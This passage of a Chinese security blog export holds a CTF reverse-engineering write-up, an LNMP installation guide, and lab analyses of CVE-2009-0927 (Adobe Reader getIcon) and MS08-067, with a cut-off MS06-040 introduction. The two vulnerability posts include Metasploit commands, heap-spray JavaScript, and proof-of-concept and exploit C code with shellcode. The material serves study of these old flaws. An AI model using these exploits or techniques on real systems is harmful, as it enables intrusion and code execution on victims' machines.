[rbp-F0h] BYREF memset(s, 0, 0x1EuLL); printf(&quot;Please Input Key: &quot;); __isoc99_scanf(&quot;%s&quot;, v5); encode(v5, (__int64)s); //关键函数 if ( strlen(v5) == key ) &#123; if ( !strcmp(s, enflag) ) puts(&quot;You are Right&quot;); else puts(&quot;flag&#123;This_1s_f4cker_flag&#125;&quot;); &#125; return 0;&#125; 所以关键是要知道 encode 函数怎么加密输入的，之后用 encode 解密enflag 12345678910111213141516171819202122int __fastcall encode(const char *a1, __int64 a2)&#123; char v3[104]; // [rsp+10h] [rbp-70h] int v4; // [rsp+78h] [rbp-8h] int i; // [rsp+7Ch] [rbp-4h] i = 0; v4 = 0; if ( strlen(a1) != key ) //12h,18位 return puts(&quot;Your Length is Wrong&quot;); for ( i = 0; i &lt; key; i += 3 ) &#123; v3[i + 64] = key ^ (a1[i] + 6); v3[i + 33] = (a1[i + 1] - 6) ^ key; v3[i + 2] = a1[i + 2] ^ 6 ^ key; //加密算法 *(_BYTE *)(a2 + i) = v3[i + 64]; *(_BYTE *)(a2 + i + 1LL) = v3[i + 33]; *(_BYTE *)(a2 + i + 2LL) = v3[i + 2]; //指针赋值 &#125; return a2;&#125; python 脚本，加密脚本逆着小写，flag 就出来了。 123456789#!/usr/bin/python#&quot;izwhroz\\&quot;\\&quot;w\\&quot;v.K\\&quot;.Ni&quot;enflag=[105, 122, 119, 104, 114, 111, 122, 34, 34, 119, 34, 118, 46, 75, 34, 46, 78, 105, 0]flag=&#x27;&#x27;for i in range(0,18,3): flag+=chr((18^enflag[i])-6) flag+=chr((18^enflag[i+1])+6) flag+=chr(18^enflag[i+2]^6) print(flag) 参考： ​ 攻防世界-Reverse-666 ​ CTF-Python常用函数语段详解 ​ ASCII 在线转换器","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.rgzzplus.com/categories/CTF/"}],"tags":[{"name":"攻防世界","slug":"攻防世界","permalink":"https://www.rgzzplus.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"reverse","slug":"reverse","permalink":"https://www.rgzzplus.com/tags/reverse/"}]},{"title":"安装LNMP","slug":"安装LNMP","date":"2022-07-22T00:19:12.000Z","updated":"2022-08-01T10:29:15.528Z","comments":true,"path":"2022/07/22/安装LNMP/","link":"","permalink":"https://www.rgzzplus.com/2022/07/22/%E5%AE%89%E8%A3%85LNMP/","excerpt":"","text":"[TOC] 开启端口 服务器：22，80，3389 LNMP 是什么？ Linux Nginx MySQL PHP 安装 LNMP 安装 screen： 1yum install screen 安装时会出现提问，都填 y 接着输入： 1screen -S lnmp 继续输入： 1wget http://soft.vpser.net/lnmp/lnmp1.6.tar.gz -cO lnmp1.6.tar.gz &amp;&amp; tar zxf lnmp1.6.tar.gz &amp;&amp; cd lnmp1.6 &amp;&amp; ./install.sh lnmp 之后会选选项，都选默认（Default） 等待安装完成后，按下Ctrl+C 退出。 现在打开浏览器，输入[服务器地址]/p.php 现在把你的域名解析到该服务器，以阿里云为例。 注意：这里我是为了测试主机能否启用，所以用内网ip进行解析，如果您需要外网访问，请用公网ip，百度 ‘ip’ 就能看到主机IP地址。 接下来，在主机上绑定域名 1lnmp vhost add 输入你的域名：test.rgzzplus.com 接下来是问你是否需要继续解析，不用就直接回车 然后是设置文件路径，回车默认 之后的按需选择 y/n 现在，来到刚刚的默认文件路径 1cd /home/wwwroot/test.rgzzplus.com/ ls 后发现是空文件夹，接着就是存放我们的网站文件了 我这里直接使用小甲鱼老师提供的简历网站 1wget https://test-fishc.oss-cn-hangzhou.aliyuncs.com/HWC/resume.zip 下载完后，解压文件 1unzip resume.zip 接下来，输入 1chown www:www -R /home/wwwroot/test.rgzzplus.com/ 接着就能打开浏览器，查看网站了 参考资料 ​ 【后端开发】10分钟教你从0搭建一台专属“云服务器” ​ 【技术交流】小甲鱼10分钟教你从0搭建一台服务器","categories":[{"name":"工具","slug":"工具","permalink":"https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"LNMP","slug":"LNMP","permalink":"https://www.rgzzplus.com/tags/LNMP/"}]},{"title":"CVE-2009-0927：PDF中的JS","slug":"CVE-2009-0927：PDF中的JS","date":"2022-07-22T00:16:24.000Z","updated":"2022-08-01T11:18:00.649Z","comments":true,"path":"2022/07/22/CVE-2009-0927：PDF中的JS/","link":"","permalink":"https://www.rgzzplus.com/2022/07/22/CVE-2009-0927%EF%BC%9APDF%E4%B8%AD%E7%9A%84JS/","excerpt":"","text":"[toc] CVE-2009-0927 简介 Adobe Reader 是非常流行的 PDF 文件阅读器，在其 Collab 对象的 getIcon() 函数中存在一个缓冲区溢出漏洞。同时由于 PDF 文档中支持内嵌的 JavaScript，攻击者可以通过在 PDF 文档中植入恶意的 JavaScript 来向 getIcon()函数传递特制的参数以触发溢出漏洞， 并结合 Heap Spray 攻击来夺取计算机的控制权。 Heap Spray：通过申请大量空间，来让程序命中，从而执行 shellcode PDF 文档格式简介 PDF 文档是一种文本和二进制混排的格式，它由四部分构成。 header：头部，标识 PDF 文档的版本。 body：主体，包含 PDF 文档的主体内容，各部分以对象方式呈现。 cross－reference：交叉引用表，通过交叉引用表可以快速的找到 PDF 文档中的各对象。 trailer：尾部，包含交叉引用的摘要和交叉引用表的起始位置。 请新建一个 PDF 文档，用普通文本编辑器打开，参阅下边的格式注释来理解文件格式。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586%PDF-1.1 //头部，说明次 PDF 文档符合 PDF1.1 规范1 0 obj&lt;&lt; /Type /Catalog //说明这个 obj 是 Catalog 对象 /Outlines 2 0 R //第二个 obj 是 Outlines /Pages 3 0 R //第三个 obj 是 Pages /OpenAction 7 0 R //第七个 obj 是 OpenAction，听这个名字大家也应该能感觉到有点料，文件打开时会执行它里边的脚本&gt;&gt;endobj2 0 obj&lt;&lt; /Type /Outlines /Count 0 //0 表示没有书签&gt;&gt;endobj3 0 obj&lt;&lt; /Type /Pages /Kids [4 0 R] //说明它的孩子、页的对象号为 4 /Count 1 //说明页码数量为 1&gt;&gt;endobj4 0 obj&lt;&lt; /Type /Page /Parent 3 0 R //其父对象的对象号为 3 /MediaBox [0 0 612 792] //页面的显示大小，以象素为单位 /Contents 5 0 R //内容对象的对象号为 5 /Resources &lt;&lt; //说明该页所要包含的资源，包括字体和内容的类型 /ProcSet [/PDF /Text] /Font &lt;&lt; /F1 6 0 R &gt;&gt; &gt;&gt;&gt;&gt;endobj5 0 obj&lt;&lt; /Length 98 &gt;&gt; //stream 对象为字节数，从 BT 开始， ET 结束，包括中间的行结束符stream //流对象开始BT /F1 12 Tf 100 700 Td 15 TL (Open File Error! Maybe the file is damaged! //文本位置和内容) Tj ETendstream //流对象结束endobj6 0 obj&lt;&lt; /Type /Font //字体对象 /Subtype /Type1 /Name /F1 /BaseFont /Helvetica /Encoding /MacRomanEncoding&gt;&gt;endobj7 0 obj&lt;&lt; /Type /Action /S /JavaScript /JS ( //可以放置 JavaScript 脚本，关键部分噢 )&gt;&gt;endobjxref //交叉引用表0 8 //说明下面的描述是从 0 号对象开始，数量为 80000000000 65535 f //一般每个 PDF 文件都是以这一行开始交叉应用表的，说明对象 0 的起始地址为 0000000000，产生号（generation number）为 65535，也是最大产生号，不可以再进行更改，而且最后对象的表示是 f, 表明该对象为 free0000000010 00000 n //表示对象 1， 也就是 catalog 对象了，0000000009 是其偏移地址，00000 为 5 位产生号，全 0 表明该对象未被修改过， n 表示该对象在使用。0000000098 00000 n0000000147 00000 n0000000208 00000 n0000000400 00000 n0000000549 00000 n0000000663 00000 ntrailer //尾部&lt;&lt; /Size 8 //该 PDF 对象数 /Root 1 0 R //根对象的对象号为 1&gt;&gt;startxref1946 //交叉引用表的偏移地址%%EOF //文件结束标志 漏洞原理及利用分析 实验环境 推荐使用的环境 备 注 操作系统 Windows XP SP3 建议在虚拟机 VMware 7.0 中运行 Adobe Reader 版本 9.0 中文版 漏洞分析 PDF 文件一旦被打开就会执行 OpenAction 对象里的脚本，所以只要在 OpenAction 对象中精心构造 JS 脚本，就能实现对 Adobe Reader 的攻击。 首先在 kali 中用 msf 生成样本，具体如下 1234567891011&gt; msf5 &gt; search cve-2009-0927&gt; exploit/windows/browser/adobe_geticon 2009-03-24 good No Adobe Collab.getIcon() Buffer Overflow&gt; exploit/windows/fileformat/adobe_geticon 2009-03-24 good No Adobe Collab.getIcon() Buffer Overflow&gt; msf5 &gt; use exploit/windows/fileformat/adobe_geticon&gt; msf5 exploit(windows/fileformat/adobe_geticon) &gt; set payload windows/exec&gt; payload =&gt; windows/exec&gt; msf5 exploit(windows/fileformat/adobe_geticon) &gt; set cmd calc.exe&gt; cmd =&gt; calc.exe&gt; msf5 exploit(windows/fileformat/adobe_geticon) &gt; run 生成样本以后，运行一下成功弹出计算器，之后我们用PDFStreamDump打开，在对象5处可以看到样本中包含的payload，dump下来之后，发现payload中的js用了超长变量名，不利于阅读代码，把变量名替换以后，得到如下可读代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344var shellcode = unescape(&quot;%u4096%ud6f9%u9147%ufd98%ufd9b%uf840%u9047......&quot;);var nopblock = &quot;&quot;;# 布置堆的内容for (i = 128; i &gt;= 0; --i) &#123; nopblock += unescape(&quot;%u9090%u9090&quot;);&#125;buff = nopblock + shellcode;nop = unescape(&quot;%u9090%u9090&quot;);headersize = 20;acl = headersize + buff.length;while (nop.length &lt; acl) &#123; nop += nop;&#125;fillblock = nop.substring(0, acl);block = nop.substring(0, nop.length - acl);while (block.length + acl &lt; 0x40000)&#123; block = block + block + fillblock;&#125; memory = new Array();for (j = 0; j &lt; 1450; j++)&#123; memory[j] = block + buff;&#125; # 用0x0a0a0a0a占领SEHvar ret_addr = unescape(&quot;%0a&quot;);while (ret_addr.length &lt; 0x4000)&#123; ret_addr += ret_addr;&#125; ret_addr = &quot;N.&quot; + ret_addr; //注意这里的 N.Collab.getIcon(ret_addr); 首先用 OllyDbg 加载 Adobe Reader，待其启动完成后通过 Adobe Reader 的菜单打开 POC 文档， OllyDbg 会因为一个写入异常而中断。 从上图中可以看到，程序在向 0x00130000 位置写入数据时发生异常，因为 0x00130000 这个地址已经超出程序的栈空间范围，一般是由于复制了超长字符串所致。 同时栈顶的 strncpy 也印证了我们的猜想，问题可能出现在这里，不妨进入 0x2210FE4E 区域看看。 发现在 0x2210FE25 处的 call edi 指令调用了 strncpy 函数，着应该就是溢出根源了。但是 strncpy 函数限制了复制字符串长度，为什么还会溢出呢？继续向上看，原来上面将源字符串长度作为了复制字符串长度，这就相当于执行了 strcpy，当源字符串长度大于目标缓冲区长度时就会发生溢出。 利用分析 漏洞原理清楚后，我们就要考虑如何利用这个漏洞了，这里我们可以选择覆盖函数的返回地址或者覆盖程序的异常处理函数指针，我们选择后者。 回顾一下 exploit 的思路：通过 Heap Spray 技术占领内存中的 0x0C0C0C0C 位置，然后再向 getIcon()函数传递超长字符串来覆盖程序的异常处理函数指针；同时这个超长字符串还有一个使命就是触发异常——当这个字符串足够长的时候（超出当前堆栈范围）就会触发写入异常，程序因此转入已被篡改了的异常处理函数，最终执行 shellcode。 最后，计算器也弹了出来：","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"RPC入侵：MS08-067","slug":"RPC入侵：MS08-067","date":"2022-07-20T08:15:17.000Z","updated":"2022-08-01T11:20:03.340Z","comments":true,"path":"2022/07/20/RPC入侵：MS08-067/","link":"","permalink":"https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS08-067/","excerpt":"","text":"[toc] MS08-067 简介 MS08-067 漏洞是由于 netapi32.dll 的导出函数 NetpwPathCanonicalize 在处理字符串时出现了错误，从而导致栈溢出，并且影响的操作系统范围很广，包括引入了 GS 安全机制的 Windows XP SP2、 Vista 以及 Windows 7。 MS08-067 的溢出发生在 NetpwPathCannonicalize 函数的子函数 CanonicalizePathName 中。当路径合并至临时的栈空间 Buff_OF 后， CanonicalizePathName 函数并不是直接将其复制到输出参数 can_path 中，而是要对 Buff_OF 串做以下三步操作，以对路径规范化。 1）将合并路径中的所有的 slash 字符‘ /’（ 0x2F）转化为 backslash 字符‘ \\’（ 0x5C）。 12345678910111213141516...5FDDA1F0 lea eax, [ebp+Buff_OF]5FDDA1F6 jz short @@chk_dos_path_type5FDDA1F8 @@replace_slash_loop:5FDDA1F8 cmp word ptr [eax], &#x27;/&#x27;5FDDA1FC jz @@slash_to_back_slash5FDDA202 @@slash_to_back_forward:5FDDA202 inc eax5FDDA203 inc eax5FDDA204 cmp word ptr [eax], 05FDDA208 jnz short @@replace_slash_loop...5FDE88EF @@slash_to_back_slash:5FDE88EF mov word ptr [eax], &#x27;\\&#x27;5FDE88F4 jmp @@slash_to_back_forward... 2）调用子函数 CheckDosPathType，检查合并路径的 DOS 路径类型，由于与溢出无关，不用深究其原理，我们只需了解这个函数的返回值，如果返回0，代码即将进入产生溢出的函数。 123456789101112...5FDDA20A @@chk_dos_path_type:5FDDA20A lea eax, [ebp+Buff_OF]5FDDA210 call CheckDosPathType5FDDA215 test eax, eax5FDDA217 jnz short @@chk_buf_of_len5FDDA219 lea eax, [ebp+Buff_OF]5FDDA21F push eax5FDDA220 call RemoveLegarcyFolder ;溢出函数5FDDA225 test eax, eax5FDDA227 jz short @@err_invalid_name... 3）溢出就发生在子函数 RemoveLegacyFolder 中； RemoveLegacyFolder 返回后，如果返回非零，表示合并路径已符合要求，若其长度未超过 maxbuf，即可复制至 can_path 中。 12345678910111213141516171819202122232425262728293031323334...5FDDA229 @@chk_buf_of_len:5FDDA229 lea eax, [ebp+Buff_OF]5FDDA22F push eax5FDDA230 call esi ; __imp_wcslen5FDDA232 lea eax, [eax+eax+2]5FDDA236 cmp eax, [ebp+arg_MaxBuf]5FDDA239 pop ecx5FDDA23A ja @@chk_retsize5FDDA240 lea eax, [ebp+Buff_OF]5FDDA246 push eax ; Source: Buff_OF5FDDA247 push [ebp+Outbuf] ; Dest: same as can_path5FDDA24D call ds:__imp_wcscpy5FDDA253 pop ecx5FDDA254 pop ecx5FDDA255 xor eax, eax5FDDA257 @@chk_security_cookie:5FDDA257 mov ecx, [ebp+security_cookie]5FDDA25A pop edi5FDDA25B pop esi5FDDA25C pop ebx5FDDA25D call chk_security_cookie5FDDA262 leave5FDDA263 retn 14h...5FDE88F9 @@chk_retsize:5FDE88F9 mov ecx, [ebp+RetSize]5FDE88FF test ecx, ecx5FDE8901 jz short @@err_buf_too_small5FDE8903 mov [ecx], eax5FDE8905 @@err_buf_too_small:5FDE8905 mov eax, NERR_BufTooSmall5FDE890A jmp @@chk_security_cookie... 认识 Legacy Folder Legacy Folder，又叫经典目录，指的是 ’.‘ (当前目录) 和 ‘…’ (上一层目录)这两个特殊的目录。 在对路径进行范式化的过程中，函数 RemoveLegacyFolder 的作用就是将合并路径中的经典目录移去（后面简称“移经”），使路径达到最简洁状态。 “移经” 测试 通过黑盒测试，可以看出 RemoveLegacyFolder 函数具有以下特性： 1）通过 II、 III 对比，目录名是以‘\\’作为隔离符的，如果‘…\\’ 的左边没有隔离符了，“移经”将失败； 2）由 VIII 可以看出，在路径中部（注意，不是首部），如果有两个连续的隔离符‘\\’，“移经”将失败； 3） XI 的返回值非零，但是合并路径中却有内容，表明“移经”操作应该通过并已经复制到 can_path 中，很可能是在最后的检查过程中，出现了错误。通过查看汇编代码，原来在路径合并结束后， NetpaPathCanonicalize 还会调用 NetpwPathType 函数对合并路径进行检查，并将 NetpwPathType 的结果作为整个函数的返回值。 XI 中的合并路径\\\\aaa 显然不是一个合法的路径 “移经” 风险 ‘ .\\’ 的移去操作很简单：只需要调用一次字符复制函数即可将 “经典目录” 移去。 ‘..\\’ 的移去操作却麻烦了不少： 如果 p1 为当前指针， p2 和 p1 总是相差 3 个字符的位置，但仅凭 p1、 p2 是无法获取 p3 ，因为 FOLDER2 的长度不固定，对于获取 p3 的位置，主要有两种解决方法： 事先定义变量记录每一个 \\ 的位置；当复制结束后，当前指针 p1 的值更新为 p3， p3 的值更新为 p4；同 p3 一样， p4 也需要变量进行记录。 如果不定义变量，则可以在“移经”后的路径中，从 p1 左侧开始，向左搜索首次出现的 ‘\\’，即 p3；如果 p1 依然指向经典目录 ‘…\\’，那么 p3 就是下一次 “移经” 复制的目的地址。 RemoveLegacyFolder 函数采用的是不定义变量更新 p3，然而正是这个 “向左（前）搜索” 存在着 “风险”。 静态分析 函数调用链 NetpwPathCanonicalize-&gt;CanonicalizePathName-&gt;RemoveLegacyFolder NetpwPathCanonicalize **函数作用：**NetpwPathCanonicalize用于格式化网络路径字符串。 如果prefix串非空，将prefix串与path串用\\相连，并复制输出到串can_path中，输出串的容量为maxbuf字节大小。 1prefix + &#x27;\\&#x27; + path =&gt; can_path [max_buf] 函数原型： 12345678Int NetpwPathCanonicalize( Uint16 path[ ], // [in] path name Uint8 can_path[ ], // [out] canonicalized path Uint32 maxbuf, // [in] max size of can_path Uint16 prefix[ ], // [in] path prefix Uint32* pathtype, // [int out] path type Uint32 pathflags // [in] path flags, 0 or 1); 通过 NetpwPathCanonicalize 函数，找到 CanonicalizePathName 函数。 在CanonicalizePathName 中找到 RemoveLegacyFolder 函数。 动态调试 在调用 RemoveLegacyFolder 时，RemoveLegacyFolder 的返回地址位于 0x12F6A4；待处理的合并路径，即 Buff_OF（ 0x12F6A8）指向的 unicode 串位于稍大的栈地址 0x12F6C0，是唯一的输入参数。 在移去经典目录‘ …\\’后， RemoveLegacyFolder 函数会向左（前）即低地址空间搜索隔离字符‘ \\’，如果前向搜索越过了待处理串的起始字符，即小于 0x12F6C0，搜索的结果将不可控，很可能远小于 ESP；当合并路径中再次出现经典目录‘ …\\’并需要移去时，复制操作会将路径数据写入前面搜索到的栈地址，产生溢出，如果路径数据经过精心设计，很可能使某个函数的返回地址被覆盖修改，使溢出被成功利用。 总结，成功溢出的条件： 1）充分条件：前向搜索隔离符时，越过了 Buff_OF 指向的待处理串。 2）必要条件：合并路径中至少存在两个连续的经典目录‘…\\’。 3）必要条件：合并路径中第二个‘…\\’后有足够多的字符数以覆盖返回地址。 POC 的构造 1234567891011121314151617181920212223242526272829303132333435#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef int (__stdcall *MYPROC) (LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD);int main(int argc, char* argv[])&#123; WCHAR path[256]; WCHAR can_path[256]; DWORD type = 1000; int retval; HMODULE handle = LoadLibrary(&quot;.\\\\netapi32.dll&quot;); MYPROC Trigger = NULL; if (NULL == handle) &#123; wprintf(L&quot;Fail to load library!\\n&quot;); return -1; &#125; Trigger = (MYPROC)GetProcAddress(handle, &quot;NetpwPathCanonicalize&quot;); if (NULL == Trigger) &#123; FreeLibrary(handle); wprintf(L&quot;Fail to get api address!\\n&quot;); return -1; &#125; path[0] = 0; wcscpy(path, L&quot;\\\\aaa\\\\..\\\\..\\\\bbbb&quot;); can_path[0] = 0; type = 1000; wprintf(L&quot;BEFORE: %s\\n&quot;, path); retval = (Trigger)(path, can_path, 1000, NULL, &amp;type, 1); wprintf(L&quot;AFTER : %s\\n&quot;, can_path); wprintf(L&quot;RETVAL: %s(0x%X)\\n\\n&quot;, retval?L&quot;FAIL&quot;:L&quot;SUCCESS&quot;, retval); FreeLibrary(handle); return 0;&#125; 编译后运行结果： NetpwPathCanonicalize 函数正常返回，但是在输出的合并路径中，仍然存在一个经典目录 ‘ …\\’，此时，我们可以结合静态分析，探究一下原因。以下是去除 ‘ …\\’ 的相关汇编代码，变量 p1、 p2、p3 的定义请参看图 26.4.5。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748...5FDDA2BD @@period_found:5FDDA2BD lea eax, [esi-2] ; esi 为当前指针 p1，此时 p1 指向‘.’5FDDA2C0 cmp ebx, eax ; ebx 始终指向最新的‘\\’，即 p25FDDA2C2 jnz @@period_after_nonslash ; 判断是否是经典目录：‘\\.’或‘\\..’5FDDA2C8 @@period_after_slash:5FDDA2C8 lea eax, [esi+2] ; eax 指向下一字符5FDDA2CB mov dx, [eax]5FDDA2CE cmp dx, &#x27;.&#x27; ; 是否‘\\..’5FDDA2D2 jnz @@nonperiod_after_period5FDDA2D8 lea eax, [esi+4] ; eax 指向下两个字符5FDDA2DB mov bx, [eax]5FDDA2DE cmp bx, &#x27;\\&#x27; ; 是否‘/../’5FDDA2E2 jz short @@skip_spps_by_copy5FDDA2E4 test bx, bx5FDDA2E7 jnz short @@move_forward5FDDA2E9 @@skip_spps_by_copy:5FDDA2E9 test edi, edi ; edi 指向 p2 之前的‘\\’，即 p35FDDA2EB jz @@exit_fail5FDDA2F1 push eax5FDDA2F2 push edi5FDDA2F3 call ds:__imp_wcscpy ; 移经操作： wcscpy(p3, p1)5FDDA2F9 test bx, bx5FDDA2FC pop ecx5FDDA2FD pop ecx5FDDA2FE jnz @@update_current_slash_after_copy…5FDE87F8 @@update_current_slash_after_copy:5FDE87F8 mov [ebp+current_slash], edi ; p2 &lt;= p35FDE87FB mov esi, edi ; p1 &lt;= p35FDE87FD lea eax, [edi-2] ; eax &lt;= p3-2，作为向前搜索‘/’ ; 的初始指针，但是这里直接将指针 ; 减 2，而没有做边界检查，这是导致 ; 溢出的根本原因！5FDE8800 jmp short @@check_previous_slash_after_copy5FDE8802 @@loop_search_previous_slash:5FDE8802 cmp eax, [ebp+arg_Path] ; 这里的边界检查已无济于事，因为 ; 在 0x5FDE87FD 处 eax 已经越界！ ; 注： arg_Path 就是 Buff_OF5FDE8805 jz short @@previous_slash_found_after_copy5FDE8807 dec eax5FDE8808 dec eax5FDE8809 @@check_previous_slash_after_copy:5FDE8809 cmp word ptr [eax], &#x27;\\&#x27;5FDE880D jnz short @@loop_search_previous_slash5FDE880F @@previous_slash_found_after_copy:... 可以看到，位于 0x5FDDA2F3 处 wcscpy 函数运行后，完成了一次“移经”操作。接着代码 0x5FDE87F8 至 0x5FDE87FD 更新相关指针。位于 0x5FDE8800 至 0x5FDE880D 的循环代码用于向前搜索隔离字符指针 p3，尽管在循环过程中，代码有做边界检查，但是在循环初始化时却没有（见 0x5FDE87FD），而直接将指针初值 EDI 减 2；一旦初始化越界，循环过程中的边界检查将失效，因为指针 EAX 永远小于 Buff_OF 的起始字符地址，而循环退出的唯一条件是在低地址空间中再次找到隔离字符‘ \\’。 调试到前向搜索越界时的状态。Buff_OF 位于 0x12F6C0，但是前向搜索的指针 EAX 已经被初始化为 0x12F6BE，小于 Buff_OF 了，我们不妨称这个指针为 previous_slash。 由于 previous_slash (=EAX) 远小于 ESP，当再次调用 wcscpy 进行字符复制时，如果复制通过精心设计， wcscpy 函数的栈帧和返回地址将被覆盖修改，也就是说当 wcscpy 退出时，溢出会被成功利用。 提示：尽管微软在 Windows XP SP2 及之后的操作系统中引入了 security cookie 机制防止缓冲区溢出，但是 wcscpy 函数依然没有并没有采用该机制，因此 MS08-067 可以在多种操作系统上成功溢出。 计算要覆盖到返回地址的字符长度，wcscpy 的返回地址位于 0x0012F684，prefix_slash 位于 0x0012F5A2 (EDI)。需要230个字符（0x0012F684 - 0x0012F5A2+0x4 = 0xe6）就能覆盖到返回地址了。 具备溢出功能的 POC 代码： 1234567891011121314151617181920212223242526272829303132333435#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef int (__stdcall *MYPROC) (LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD);int main(int argc, char* argv[])&#123; WCHAR path[256]; WCHAR can_path[256]; DWORD type = 1000; int retval; HMODULE handle = LoadLibrary(&quot;.\\\\netapi32.dll&quot;); MYPROC Trigger = NULL; if (NULL == handle) &#123; wprintf(L&quot;Fail to load library!\\n&quot;); return -1; &#125; Trigger = (MYPROC)GetProcAddress(handle, &quot;NetpwPathCanonicalize&quot;); if (NULL == Trigger) &#123; FreeLibrary(handle); wprintf(L&quot;Fail to get api address!\\n&quot;); return -1; &#125; path[0] = 0; wcscpy(path, L&quot;\\\\aaa\\\\..\\\\..\\\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;); can_path[0] = 0; type = 1000; wprintf(L&quot;BEFORE: %s\\n&quot;, path); retval = (Trigger)(path, can_path, 1000, NULL, &amp;type, 1); wprintf(L&quot;AFTER : %s\\n&quot;, can_path); wprintf(L&quot;RETVAL: %s(0x%X)\\n\\n&quot;, retval?L&quot;FAIL&quot;:L&quot;SUCCESS&quot;, retval); FreeLibrary(handle); return 0;&#125; 设计出最终的 exploit代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef int (__stdcall *MYPROC) (LPWSTR, LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD);// address of jmp esp#define JMP_ESP &quot;\\x0b\\xe9\\xe0\\x5f\\x00\\x00&quot;//shellcode#define SHELL_CODE \\&quot;\\x90\\x90\\x90\\x90&quot; \\&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; \\&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; \\&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; \\&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; \\&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; \\&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; \\&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; \\&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; \\&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; \\&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; \\&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x00\\x00&quot;int main(int argc, char* argv[])&#123; WCHAR path[256]; WCHAR can_path[256]; DWORD type = 1000; int retval; HMODULE handle = LoadLibrary(&quot;.\\\\netapi32.dll&quot;); MYPROC Trigger = NULL; if (NULL == handle) &#123; wprintf(L&quot;Fail to load library!\\n&quot;); return -1; &#125; Trigger = (MYPROC)GetProcAddress(handle, &quot;NetpwPathCanonicalize&quot;); if (NULL == Trigger) &#123; FreeLibrary(handle); wprintf(L&quot;Fail to get api address!\\n&quot;); return -1; &#125; path[0] = 0; wcscpy(path, L&quot;\\\\aaa\\\\..\\\\..\\\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;); wcscat(path, (const unsigned short *)JMP_ESP); wcscat(path, (const unsigned short *)SHELL_CODE); can_path[0] = 0; type = 1000; wprintf(L&quot;BEFORE: %s\\n&quot;, path); retval = (Trigger)(path, can_path, 1000, NULL, &amp;type, 1); wprintf(L&quot;AFTER : %s\\n&quot;, can_path); wprintf(L&quot;RETVAL: %s(0x%X)\\n\\n&quot;, retval?L&quot;FAIL&quot;:L&quot;SUCCESS&quot;, retval); FreeLibrary(handle); return 0;&#125; 运行结果：","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"RPC入侵：MS06-040","slug":"RPC入侵：MS06-040","date":"2022-07-20T08:14:55.000Z","updated":"2022-08-01T11:19:57.752Z","comments":true,"path":"2022/07/20/RPC入侵：MS06-040/","link":"","permalink":"https://www.rgzzplus.com/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/","excerpt":"","text":"[toc] RPC 漏洞 RPC 漏洞简介 RPC 即 Remote Procedure Call，它是一种计算机进程间的通信方式。简单地说，RPC 就是让您在自己地程序中调用一个函数（可能需要很大地计算量），而这个函数在另外一个或多个远程机器上执行，执行完后将结果传回您的机器进行后续操作。 RPC漏洞，远程调用函数出现了问题，甚至有可被利用的安全漏洞。 RPC编程简介 在 VC 中进行 RPC 调用的流程如下图所示。 使用 RPC 调用时首先应当定义远程进程的接口 IDL 文件。 IDL（ Interface Description Language）是专门用来定义接口的语言，在这个文件里我们要指定 RPC 的接口信息以及 interface 下的 function 信息，包括函数的声明，参数等。 微软的 IDL 叫做 MIDL， 是兼容 IDL 标准的。定义好的 IDL 文件接口经过微软的 MIDL 编译器编译后会生成 